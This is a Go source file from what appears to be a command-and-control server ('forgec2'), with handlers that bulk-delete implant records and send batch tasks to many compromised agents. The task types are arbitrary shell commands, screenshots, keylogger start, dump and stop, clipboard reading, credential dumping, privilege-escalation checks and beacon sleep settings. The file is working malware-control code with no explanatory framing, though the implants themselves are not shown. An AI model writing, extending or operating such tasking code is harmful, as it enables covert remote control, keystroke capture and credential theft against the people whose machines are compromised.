package server

import (
	"fmt"
	"log/slog"
	"net/http"
	"time"

	"github.com/forgec2/forgec2/internal/db"
	"github.com/gin-gonic/gin"
)

func (s *Server) handleBulkDeleteAgents(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	var req struct {
		AgentIDs []string `json:"agent_ids"`
	}
	if err := c.ShouldBindJSON(&req); err != nil || len(req.AgentIDs) == 0 {
		respondError(c, http.StatusBadRequest, "agent_ids required")
		return
	}

	deleted := 0
	failed := 0
	for _, id := range req.AgentIDs {
		if s.deleteAgentRecord(id) {
			deleted++
			s.LogAuditRecord(c, "delete_agent", "agent", id, "bulk delete", true, nil)
		} else {
			failed++
		}
	}

	user, _ := c.Get("user")
	operator := fmt.Sprintf("%v", user)
	s.broadcastBulkAgentDeleteAlert(operator, deleted)
	s.LogAuditRecord(c, "batch_delete_agents", "agent", "", fmt.Sprintf("deleted %d agents (%d failed)", deleted, failed), true, nil)
	slog.Warn("Bulk agent delete", "deleted", deleted, "failed", failed, "operator", operator)

	c.JSON(http.StatusOK, gin.H{
		"success": true,
		"deleted": deleted,
		"failed":  failed,
	})
}

func (s *Server) handleBatchCommand(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}

	var req struct {
		AgentIDs []string `json:"agent_ids"`
		Command  string   `json:"command"`
		Shell    string   `json:"shell"`
		TaskType string   `json:"task_type"` // shell, screenshot, upload, download, sleep, keylogger, etc
		File     string   `json:"file"`      // for upload/download
		Args     string   `json:"args"`      // additional arguments
	}

	if err := c.ShouldBindJSON(&req); err != nil {
		respondError(c, http.StatusBadRequest, "invalid json")
		return
	}

	if len(req.AgentIDs) == 0 {
		respondError(c, http.StatusBadRequest, "no agents selected")
		return
	}

	// Default task type
	if req.TaskType == "" {
		req.TaskType = "shell"
	}

	taskCount := 0
	skippedLocked := 0
	failedCount := 0

	// Batch-load all agents to avoid N+1 queries
	var existingAgents []db.Implant
	s.db.Select("id").Where("id IN ?", req.AgentIDs).Find(&existingAgents)
	existingSet := make(map[string]bool, len(existingAgents))
	for _, a := range existingAgents {
		existingSet[a.ID] = true
	}

	for _, agentID := range req.AgentIDs {
		if !existingSet[agentID] {
			failedCount++
			continue
		}

		var task *db.Task
		var err error

		// Create task based on type
		switch req.TaskType {
		case "shell":
			task, err = s.createTask(agentID, "shell", req.Command, req.Shell, "", "", 0, 0)
		case "screenshot":
			task, err = s.createTask(agentID, "screenshot", "screenshot", "", "", "", 0, 0)
		case "keylogger_start":
			task, err = s.createTask(agentID, "keylogger_start", "keylogger_start", "", "", "", 0, 0)
		case "keylogger_dump":
			task, err = s.createTask(agentID, "keylogger_dump", "keylogger_dump", "", "", "", 0, 0)
		case "keylogger_stop":
			task, err = s.createTask(agentID, "keylogger_stop", "keylogger_stop", "", "", "", 0, 0)
		case "clipboard_get":
			task, err = s.createTask(agentID, "clipboard_get", "clipboard_get", "", "", "", 0, 0)
		case "creds_dump":
			task, err = s.createTask(agentID, "creds", "creds_dump", "", "", "", 0, 0)
		case "privesc_check":
			task, err = s.createTask(agentID, "privesc_check", "privesc_check", "", "", "", 0, 0)
		case "sleep":
			// Args format: "interval,jitter" e.g., "30,20"
			task, err = s.createTask(agentID, "set_sleep", req.Args, "", "", "", 0, 0)
		default:
			task, err = s.createTask(agentID, req.TaskType, req.Command, "", "", "", 0, 0)
		}

		if err != nil {
			slog.Error("Batch command: failed to create task", "agent_id", agentID, "err", err)
			failedCount++
			continue
		}

		s.broadcastTaskUpdate(agentID, *task)
		taskCount++
	}

	slog.Info("Batch command sent", "count", taskCount, "skipped_locked", skippedLocked, "failed", failedCount, "type", req.TaskType, "command", req.Command)
	s.LogAuditRecord(c, "batch_command", "agent", "", fmt.Sprintf("%s to %d agents (%d skipped, %d failed)", req.TaskType, taskCount, skippedLocked, failedCount), true, nil)

	// Record in bulk history ring buffer
	user, _ := c.Get("user")
	operator := fmt.Sprintf("%v", user)
	s.pushBulkResult(BulkResult{
		Timestamp: time.Now(),
		Command:   req.Command,
		TaskType:  req.TaskType,
		Created:   taskCount,
		Skipped:   skippedLocked,
		Failed:    failedCount,
		Operator:  operator,
	})

	c.JSON(http.StatusOK, gin.H{
		"success":        true,
		"tasks_created":  taskCount,
		"skipped_locked": skippedLocked,
		"failed":         failedCount,
	})
}
